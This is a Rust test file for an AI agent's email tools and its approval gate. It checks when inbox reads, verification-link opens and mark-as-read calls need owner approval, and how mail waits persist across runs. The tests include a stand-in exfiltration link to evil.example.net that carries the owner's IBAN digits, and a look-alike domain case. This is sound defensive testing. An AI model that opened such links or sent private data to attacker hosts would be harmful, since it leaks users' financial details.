//! A bot that has a mail identity knows it (a fixed fact block in every run), and
//! the two calls of a sign-up that the taint gate would ask about (reading its
//! own inbox, opening the link the mail tool returned as followable) run without
//! a card only for an owner-started run on the Full level.

use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

use async_trait::async_trait;
use builtin_tools::connector_email::{
    AccountConfig, AccountKind, AgentMailEndpoint, EmailConnector, IdentitySettings, ImapSettings,
    SendMode, SmtpSettings,
};
use permission_engine::Policy;
use protocol::{BotId, Event, PermissionCategory};
use secret_store::{MemoryStore, SecretRef};
use serde_json::{Value, json};
use task_runtime::RunState;
use tool_registry::{
    ContentClass, ContentPart, Effect, Platform, Tool, ToolContext, ToolError, ToolOutput, ToolSpec,
};

use crate::tests::{
    Fake, TestTool, calls, cfg, make_loop, profile, setup, t, text, until, with_class,
};

const FULL: &str = "[permissions]\npreset = \"full\"\n";
const GOOD: &str = "https://app.example.com/verify?token=abc";
const EVIL: &str = "https://evil.example.net/steal?d=tail4242";

pub(crate) fn account(
    name: &str,
    bot: Option<String>,
    address: &str,
    mode: SendMode,
) -> AccountConfig {
    AccountConfig {
        name: name.into(),
        address: address.into(),
        username: String::new(),
        password: SecretRef::new(format!("email/{name}/api_key")).unwrap(),
        imap: ImapSettings::default(),
        smtp: SmtpSettings::default(),
        drafts_folder: "Drafts".into(),
        extra_root_pem: None,
        timeout_secs: 30,
        bot,
        allowed_senders: Vec::new(),
        identity: IdentitySettings {
            send_mode: mode,
            ..IdentitySettings::default()
        },
        kind: AccountKind::AgentMail,
        inbox_id: Some(address.into()),
    }
}

pub(crate) fn connector(accounts: Vec<AccountConfig>) -> Arc<EmailConnector> {
    let c = EmailConnector::reloadable_with(
        Arc::new(MemoryStore::new()),
        AgentMailEndpoint::loopback_mock_for_tests("http://127.0.0.1:9").unwrap(),
    );
    c.replace_accounts(accounts).unwrap();
    Arc::new(c)
}

/// Stands in for `email_wait_for`: same spec shape, answers with one followable link.
struct WaitFake {
    spec: ToolSpec,
    count: Arc<AtomicUsize>,
    /// The `link_site` it reports (the site its links were judged against).
    site: Option<&'static str>,
}

fn wait_fake() -> Arc<WaitFake> {
    mail_fake(builtin_tools::mail_wait::EMAIL_WAIT_FOR)
}

/// A mail tool of the bot's own inbox named `name` that answers with structured JSON.
fn mail_fake(name: &str) -> Arc<WaitFake> {
    Arc::new(WaitFake {
        spec: ToolSpec {
            name: name.into(),
            description: "wait for mail".into(),
            input_schema: json!({"type": "object"}),
            effect: Effect::Read,
            category: PermissionCategory::Messaging,
            platforms: vec![Platform::All],
            // As the real tool declares it.
            content: builtin_tools::classify(builtin_tools::mail_wait::EMAIL_WAIT_FOR)
                .expect("a built-in tool"),
        },
        count: Arc::new(AtomicUsize::new(0)),
        site: Some("example.com"),
    })
}

/// A `email_wait_for` whose links were judged against `site` (`None`: only the owner's list).
fn wait_fake_for(site: Option<&'static str>) -> Arc<WaitFake> {
    let mut f = Arc::try_unwrap(wait_fake()).ok().unwrap();
    f.site = site;
    Arc::new(f)
}

#[async_trait]
impl Tool for WaitFake {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }
    async fn call(&self, _: &ToolContext, _: Value) -> Result<ToolOutput, ToolError> {
        self.count.fetch_add(1, Ordering::SeqCst);
        Ok(ToolOutput {
            content: vec![ContentPart::Json {
                data: json!({"found": true, "followable_links": [GOOD], "link_site": self.site, "codes": []}),
            }],
            spill: None,
            exposure: None,
        })
    }
}

fn open_tool() -> Arc<TestTool> {
    Arc::new(with_class(
        "browser_open",
        Effect::Write,
        PermissionCategory::Browser,
        ContentClass::all(),
        "opened",
    ))
}

fn page_tool() -> Arc<TestTool> {
    Arc::new(with_class(
        "fs_read",
        Effect::Read,
        PermissionCategory::Fs,
        ContentClass::untrusted_private(),
        "a sign-up page; the owner's iban ends in tail4242",
    ))
}

/// Run: read a page, wait for the mail, open the followable link, open another
/// link. Returns the tool and URL of the first call that asked, or `None` when
/// the run finished without asking.
async fn first_ask(source: &'static str, own: bool, extra: &str) -> Option<(String, Value)> {
    let env = setup();
    let bot = env.bot.to_string();
    let conn = connector(vec![account(
        "bot-mail",
        own.then(|| bot.clone()),
        "me@agentmail.to",
        SendMode::Ask,
    )]);
    let page = page_tool();
    let open = open_tool();
    let wait = wait_fake();
    let fake = Fake::new(vec![
        calls(&[("c1", "fs_read", json!({"path": "page.html"}))]),
        calls(&[("c2", "email_wait_for", json!({}))]),
        calls(&[("c3", "browser_open", json!({"url": GOOD}))]),
        calls(&[("c4", "browser_open", json!({"url": EVIL}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&page), t(&open)],
        profile(extra),
        cfg(Policy::full()),
    );
    lp.tool_registry()
        .register(Arc::clone(&wait) as Arc<dyn Tool>);
    lp.mail_handle().set(conn);
    let mut rx = lp.subscribe();
    lp.send_user_message_from(env.chat, "sign up", crate::MessageMode::Steer, source)
        .unwrap();
    let ev = until(&mut rx, |e| {
        matches!(e, Event::ApprovalNeeded(_) | Event::RunFinished(_))
    })
    .await;
    match ev {
        Event::ApprovalNeeded(a) => Some((a.tool_name, a.input)),
        _ => None,
    }
}

#[tokio::test]
async fn an_owner_run_on_full_reads_its_own_inbox_and_opens_the_followable_link_without_a_card() {
    // The first thing that asks is the OTHER link: neither the inbox read nor the
    // link the mail tool returned needed a card.
    let (tool, input) = first_ask("owner", true, FULL)
        .await
        .expect("the evil link asks");
    assert_eq!(tool, "browser_open");
    assert_eq!(input["url"], EVIL);
}

#[tokio::test]
async fn a_run_that_is_not_owner_started_keeps_asking_for_the_inbox_read() {
    for source in ["imported", "telegram"] {
        let (tool, _) = first_ask(source, true, FULL).await.expect("asks");
        assert_eq!(tool, "email_wait_for", "{source}");
    }
}

#[tokio::test]
async fn an_inbox_every_bot_may_use_is_not_the_bots_own_and_still_asks() {
    let (tool, _) = first_ask("owner", false, FULL).await.expect("asks");
    assert_eq!(tool, "email_wait_for");
}

#[tokio::test]
async fn below_full_nothing_is_waived() {
    let (tool, _) = first_ask("owner", true, "").await.expect("asks");
    assert_eq!(tool, "email_wait_for");
}

/// The system prompt of the first model call of a run of `bot` with `accounts`.
async fn system_prompt(
    accounts: impl FnOnce(&BotId) -> Vec<AccountConfig>,
    tools: &[&str],
) -> String {
    let env = setup();
    let conn = connector(accounts(&env.bot));
    let fake = Fake::new(vec![text("hi")]);
    let made: Vec<Arc<TestTool>> = tools
        .iter()
        .map(|n| {
            Arc::new(with_class(
                n,
                Effect::Read,
                PermissionCategory::Fs,
                ContentClass::none(),
                "x",
            ))
        })
        .collect();
    let refs: Vec<&Arc<TestTool>> = made.iter().collect();
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &refs,
        profile(""),
        cfg(Policy::full()),
    );
    lp.mail_handle().set(conn);
    let run = lp.run_turn(env.chat, "hello").unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    fake.request(0).messages[0]
        .content
        .as_str()
        .unwrap()
        .to_owned()
}

#[tokio::test]
async fn a_bot_with_an_identity_is_told_its_address_and_how_to_read_it() {
    let sys = system_prompt(
        |bot| {
            vec![account(
                "bot-mail",
                Some(bot.to_string()),
                "me@agentmail.to",
                SendMode::DraftOnly,
            )]
        },
        &["email_search", "email_read", "email_wait_for", "email_send"],
    )
    .await;
    assert!(sys.contains("Your mail identity:"), "{sys}");
    assert!(sys.contains("me@agentmail.to"), "{sys}");
    assert!(sys.contains("send mode: draft only"), "{sys}");
    assert!(sys.contains("verification mails"), "{sys}");
    assert!(sys.contains("email_wait_for"), "{sys}");
}

#[tokio::test]
async fn a_bot_without_an_identity_gets_no_mail_block_and_no_other_bots_address() {
    let sys = system_prompt(
        |_| {
            vec![
                account(
                    "other-bots-mail",
                    Some(BotId::new().to_string()),
                    "secret-other@agentmail.to",
                    SendMode::Ask,
                ),
                // An inbox every bot may use is not this bot's identity either.
                account("pool", None, "pool@agentmail.to", SendMode::Ask),
            ]
        },
        &["email_search", "email_read"],
    )
    .await;
    assert!(!sys.contains("Your mail identity"), "{sys}");
    assert!(!sys.contains("secret-other@agentmail.to"), "{sys}");
    assert!(!sys.contains("pool@agentmail.to"), "{sys}");
}

#[tokio::test]
async fn the_block_does_not_promise_tools_the_bot_does_not_have() {
    let sys = system_prompt(
        |bot| {
            vec![account(
                "bot-mail",
                Some(bot.to_string()),
                "me@agentmail.to",
                SendMode::Ask,
            )]
        },
        &["fs_read"],
    )
    .await;
    assert!(sys.contains("me@agentmail.to"), "{sys}");
    assert!(sys.contains("switched off"), "{sys}");
    assert!(!sys.contains("email_wait_for"), "{sys}");
}

// ---- A background mail wait belongs to its run ---------------------------------------------

/// The `wait_id` of the pending answer a tool message holds (`mw-` and 32 hex digits).
fn wait_id_in(message: &str) -> String {
    let at = message
        .find("mw-")
        .unwrap_or_else(|| panic!("a pending answer carries a wait id, got: {message}"));
    message[at..at + 3 + 32].to_owned()
}

fn mail_wait_tool(bot: BotId) -> Arc<dyn Tool> {
    use secret_store::SecretStore as _;
    // A key is stored (so the wait really polls) and the endpoint is a dead port (every poll
    // fails the way a network blip does: retried, the wait stays pending for seconds).
    let store = Arc::new(MemoryStore::new());
    store
        .set("email/bot-mail/api_key", "am_tool_test_KEY_31ff")
        .unwrap();
    let conn = EmailConnector::reloadable_with(
        store,
        AgentMailEndpoint::loopback_mock_for_tests("http://127.0.0.1:9").unwrap(),
    );
    conn.replace_accounts(vec![account(
        "bot-mail",
        Some(bot.to_string()),
        "me@agentmail.to",
        SendMode::Ask,
    )])
    .unwrap();
    let handle = Arc::new(builtin_tools::connector_email::MailHandle::new());
    handle.set(Arc::new(conn));
    builtin_tools::mail_wait::email_wait_for_tool(
        handle,
        Arc::new(builtin_tools::connector_email::PageOriginSlot::new()),
        None,
        None,
    )
}

/// What the run's own model would do next with the id: collect it, in that run.
async fn collect_in_run(
    wait: &Arc<dyn Tool>,
    bot: BotId,
    run: protocol::RunId,
    wait_id: &str,
) -> Result<ToolOutput, ToolError> {
    wait.call(
        &ToolContext {
            bot_id: Some(bot.to_string()),
            run_id: run.to_string(),
            ..ToolContext::default()
        },
        json!({"wait_id": wait_id, "block_seconds": 1}),
    )
    .await
}

/// A run that ends leaves nobody to collect its background waits: their polling stops and their
/// slots are free again, but the wait itself is kept, so the bot's NEXT run (the next mission
/// session) takes it over with the same id. (The wait here keeps polling for several seconds
/// if nothing ends it.)
#[tokio::test]
async fn a_background_mail_wait_outlives_its_run_for_the_bots_next_run() {
    let env = setup();
    let wait = mail_wait_tool(env.bot);
    let fake = Fake::new(vec![
        calls(&[("c1", "email_wait_for", json!({"block_seconds": 1}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[],
        profile(FULL),
        cfg(Policy::full()),
    );
    lp.sh.tools.register(Arc::clone(&wait));
    let run = lp.run_turn(env.chat, "wait for the mail").unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);

    let id = wait_id_in(&crate::tests::tool_messages(&fake.request(1))[0]);
    // The next session is a run of its own: it finds the wait by the id the last one noted.
    let next = protocol::RunId::new();
    let again = collect_in_run(&wait, env.bot, next, &id).await.unwrap();
    assert!(format!("{again:?}").contains("pending"), "{again:?}");
    assert!(format!("{again:?}").contains(&id), "{again:?}");
    // Another bot has no such wait.
    assert!(
        collect_in_run(&wait, BotId::new(), next, &id)
            .await
            .is_err()
    );
}

/// Only the owner's Stop forgets a wait for good: nothing is left for a later run.
#[tokio::test]
async fn stopping_a_run_forgets_its_mail_waits_for_good() {
    let env = setup();
    let wait = mail_wait_tool(env.bot);
    let run = protocol::RunId::new();
    let out = wait
        .call(
            &ToolContext {
                bot_id: Some(env.bot.to_string()),
                run_id: run.to_string(),
                ..ToolContext::default()
            },
            json!({"block_seconds": 1}),
        )
        .await
        .unwrap();
    let id = wait_id_in(&format!("{out:?}"));
    builtin_tools::wait::cancel_run_waits(&run.to_string());
    let e = collect_in_run(&wait, env.bot, protocol::RunId::new(), &id)
        .await
        .unwrap_err();
    assert!(e.to_string().contains("no such wait"), "{e}");
}

/// A run parked for an approval when the daemon shuts down is paused; its polling goes with it
/// (no polling task outlives the loop) and the wait waits for the bot's next run.
#[tokio::test]
async fn shutdown_ends_the_polling_of_the_runs_it_pauses_and_keeps_their_waits() {
    let env = setup();
    let wait = mail_wait_tool(env.bot);
    let write = Arc::new(crate::tests::tool("t.write", Effect::Write, "w"));
    let fake = Fake::new(vec![
        calls(&[("c1", "email_wait_for", json!({"block_seconds": 1}))]),
        calls(&[("c2", "t.write", json!({}))]),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&write)],
        profile(""),
        cfg(Policy::approve_destructive()),
    );
    lp.sh.tools.register(Arc::clone(&wait));
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "wait, then write").unwrap();
    until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await;
    let id = wait_id_in(&crate::tests::tool_messages(&fake.request(1))[0]);
    // Still collectable while the run lives.
    let live = collect_in_run(&wait, env.bot, run, &id).await.unwrap();
    assert!(format!("{live:?}").contains("pending"), "{live:?}");

    let paused = lp.shutdown(std::time::Duration::from_secs(30)).await;
    assert_eq!(paused, vec![run]);
    // The old run's task is gone; its wait is carried on by whichever run asks next.
    let after = collect_in_run(&wait, env.bot, protocol::RunId::new(), &id)
        .await
        .unwrap();
    assert!(format!("{after:?}").contains("pending"), "{after:?}");
}

// ---- Many sites: polling is not looping, and links outlive a session --------------------------

/// Asking for the same wait again and again with its id is waiting. A stand-in tool with the
/// real name answers at once, so only the loop guard decides. Returns how many calls ran and
/// whether the guard stopped the run.
async fn poll_run(args: Value, n: usize) -> (usize, bool) {
    let env = setup();
    let mut script: Vec<_> = (0..n)
        .map(|i| calls(&[(&format!("c{i}"), "email_wait_for", args.clone())]))
        .collect();
    script.push(text("done"));
    let poll = Arc::new(crate::tests::tool(
        "email_wait_for",
        Effect::Read,
        "pending",
    ));
    let fake = Fake::new(script);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&poll)],
        profile(""),
        cfg(Policy::full()),
    );
    let run = lp.run_turn(env.chat, "wait for the mail").unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    (
        poll.count.load(Ordering::SeqCst),
        lp.stopped_by_guard(run).unwrap(),
    )
}

#[tokio::test]
async fn polling_a_mail_wait_by_id_is_not_a_repeat_loop() {
    let real = builtin_tools::connector_email::WaitStore::new_wait_id();
    // With a wait id the store could have handed out: seven identical calls in a row all run
    // (repeat_stop is 5).
    assert_eq!(
        poll_run(json!({"wait_id": real, "block_seconds": 1}), 7).await,
        (7, false)
    );
    // Without one it is an ordinary repeat and stops as before.
    assert_eq!(poll_run(json!({"block_seconds": 1}), 7).await, (4, true));
}

#[tokio::test]
async fn a_made_up_or_endless_wait_poll_is_still_a_repeat_loop() {
    // An id in no shape the store uses (a model inventing one) or an empty one earns nothing.
    for fake in ["mw-abc", "x", "", "mw-live"] {
        assert_eq!(
            poll_run(json!({"wait_id": fake, "block_seconds": 1}), 7).await,
            (4, true),
            "{fake:?}"
        );
    }
    // A real id is exempt for a while (a ten-minute wait polled every 30 s), then counts.
    let real = builtin_tools::connector_email::WaitStore::new_wait_id();
    let (ran, stopped) = poll_run(json!({"wait_id": real, "block_seconds": 1}), 40).await;
    assert!(stopped, "an endless poll ends");
    assert_eq!(ran, crate::exec::MAX_WAIT_POLLS);
}

/// The first thing that asks in a SECOND session: read a page, open the link the first
/// session's mail gave, open another link. With the first session's wait noted, only the
/// other link asks.
async fn second_session_first_ask(first_session_read_the_mail: bool) -> Value {
    second_session(
        first_session_read_the_mail,
        wait_fake(),
        Some("https://app.example.com"),
        &[],
    )
    .await
}

/// [`second_session_first_ask`] with the wait the first session ran, the page the second
/// session's browser is on, and the owner's verification-link domains.
async fn second_session(
    first_session_read_the_mail: bool,
    wait: Arc<WaitFake>,
    browser_on: Option<&str>,
    owner_domains: &[&str],
) -> Value {
    let env = setup();
    let bot = env.bot.to_string();
    let conn = connector(vec![account(
        "bot-mail",
        Some(bot),
        "me@agentmail.to",
        SendMode::Ask,
    )]);
    // What the bot reads before it opens anything: a page, and its own mail as structured
    // data (a run that holds private data and read untrusted text is the one whose link opens
    // would ask).
    let page = page_tool();
    let inbox = mail_fake("email_read");
    let open = open_tool();
    *open.page_origin.lock() = browser_on.map(str::to_owned);
    let mut script = Vec::new();
    if first_session_read_the_mail {
        script.push(calls(&[("a1", "fs_read", json!({"path": "page.html"}))]));
        script.push(calls(&[("a2", "email_wait_for", json!({}))]));
        script.push(text("noted"));
    }
    script.push(calls(&[("c1", "fs_read", json!({"path": "page.html"}))]));
    script.push(calls(&[("c1b", "email_read", json!({}))]));
    script.push(calls(&[("c2", "browser_open", json!({"url": GOOD}))]));
    script.push(calls(&[("c3", "browser_open", json!({"url": EVIL}))]));
    script.push(text("done"));
    let fake = Fake::new(script);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&page), t(&open)],
        profile(FULL),
        cfg(Policy::full()),
    );
    lp.tool_registry()
        .register(Arc::clone(&wait) as Arc<dyn Tool>);
    lp.tool_registry()
        .register(Arc::clone(&inbox) as Arc<dyn Tool>);
    if !owner_domains.is_empty() {
        let mut settings = conn.guard().settings();
        settings.verification_link_domains = owner_domains.iter().map(|d| (*d).into()).collect();
        conn.guard().set_settings(settings).unwrap();
    }
    lp.mail_handle().set(conn);
    if first_session_read_the_mail {
        let mut rx = lp.subscribe();
        lp.send_user_message_from(env.chat, "sign up", crate::MessageMode::Steer, "owner")
            .unwrap();
        until(&mut rx, |e| matches!(e, Event::RunFinished(_))).await;
    }
    let mut rx = lp.subscribe();
    lp.send_user_message_from(env.chat, "go on", crate::MessageMode::Steer, "owner")
        .unwrap();
    match until(&mut rx, |e| {
        matches!(e, Event::ApprovalNeeded(_) | Event::RunFinished(_))
    })
    .await
    {
        Event::ApprovalNeeded(a) => a.input,
        other => panic!("expected a card, got {other:?}"),
    }
}

#[tokio::test]
async fn the_link_a_mail_gave_stays_followable_in_the_bots_next_session() {
    // Control: no earlier session read a mail, so the very first link asks.
    assert_eq!(second_session_first_ask(false).await["url"], GOOD);
    // After a session that did, that link opens without a card; the other one still asks.
    assert_eq!(second_session_first_ask(true).await["url"], EVIL);
}

#[tokio::test]
async fn a_remembered_link_is_followed_only_while_the_browser_is_on_its_site() {
    let ask = |wait, on: Option<&str>, domains: &[&str]| {
        let on = on.map(str::to_owned);
        let domains: Vec<String> = domains.iter().map(|d| (*d).to_owned()).collect();
        async move {
            let d: Vec<&str> = domains.iter().map(String::as_str).collect();
            second_session(true, wait, on.as_deref(), &d).await["url"].clone()
        }
    };
    // The site the wait judged it on (a sibling host counts: registrable domain).
    assert_eq!(
        ask(wait_fake(), Some("https://www.example.com"), &[]).await,
        EVIL
    );
    // The run now works on another site: the link of site A asks.
    assert_eq!(
        ask(wait_fake(), Some("https://other.test"), &[]).await,
        GOOD
    );
    // A look-alike of the site is another site.
    assert_eq!(
        ask(wait_fake(), Some("https://example.com.evil.test"), &[]).await,
        GOOD
    );
    // No page open (or none the browser can name): nothing places the link.
    assert_eq!(ask(wait_fake(), None, &[]).await, GOOD);
}

#[tokio::test]
async fn a_remembered_link_never_opens_wider_than_its_wait_allowed() {
    let ask = |wait, on: Option<&str>, domains: &[&str]| {
        let on = on.map(str::to_owned);
        let domains: Vec<String> = domains.iter().map(|d| (*d).to_owned()).collect();
        async move {
            let d: Vec<&str> = domains.iter().map(String::as_str).collect();
            second_session(true, wait, on.as_deref(), &d).await["url"].clone()
        }
    };
    // Judged on no site (only the owner's list could allow it) and the list does not name
    // it now: it asks, whatever page the browser is on.
    assert_eq!(
        ask(wait_fake_for(None), Some("https://app.example.com"), &[]).await,
        GOOD
    );
    // Same, with the owner's list naming it: exactly what the wait allowed, so it opens.
    assert_eq!(
        ask(
            wait_fake_for(None),
            Some("https://other.test"),
            &["example.com"]
        )
        .await,
        EVIL
    );
    // Judged on site A, but the link is not on A (a stale record, or a hand-edited file): the
    // verifier refuses it again, even with the browser on A.
    assert_eq!(
        ask(
            wait_fake_for(Some("other.test")),
            Some("https://other.test"),
            &[]
        )
        .await,
        GOOD
    );
    // An owner list that no longer names the domain takes the second reason away.
    assert_eq!(
        ask(
            wait_fake_for(None),
            Some("https://app.example.com"),
            &["unrelated.test"]
        )
        .await,
        GOOD
    );
}

/// Run: read a page (so the run holds untrusted content), then `email_mark_read`. Returns whether
/// the mark-as-read asked.
async fn mark_read_asks(source: &'static str, own: bool, extra: &str) -> bool {
    let env = setup();
    let bot = env.bot.to_string();
    let conn = connector(vec![account(
        "bot-mail",
        own.then(|| bot.clone()),
        "me@agentmail.to",
        SendMode::Ask,
    )]);
    let page = page_tool();
    let mark = Arc::new(with_class(
        "email_mark_read",
        Effect::Write,
        PermissionCategory::Messaging,
        ContentClass::egress(),
        "marked",
    ));
    let fake = Fake::new(vec![
        calls(&[("c1", "fs_read", json!({"path": "page.html"}))]),
        calls(&[("c2", "email_mark_read", json!({"message_id": "msg-1"}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&page), t(&mark)],
        profile(extra),
        cfg(Policy::full()),
    );
    lp.mail_handle().set(conn);
    let mut rx = lp.subscribe();
    lp.send_user_message_from(env.chat, "sign up", crate::MessageMode::Steer, source)
        .unwrap();
    let ev = until(&mut rx, |e| {
        matches!(e, Event::ApprovalNeeded(_) | Event::RunFinished(_))
    })
    .await;
    match ev {
        Event::ApprovalNeeded(a) => {
            assert_eq!(a.tool_name, "email_mark_read");
            true
        }
        _ => false,
    }
}

#[tokio::test]
async fn marking_a_mail_of_the_own_inbox_as_read_needs_no_card_for_an_owner_run_on_full() {
    assert!(!mark_read_asks("owner", true, FULL).await);
    // The same call asks wherever a read of that inbox asks.
    assert!(
        mark_read_asks("owner", false, FULL).await,
        "not the bot's own inbox"
    );
    assert!(
        mark_read_asks("telegram", true, FULL).await,
        "not an owner run"
    );
    assert!(mark_read_asks("owner", true, "").await, "below Full");
}
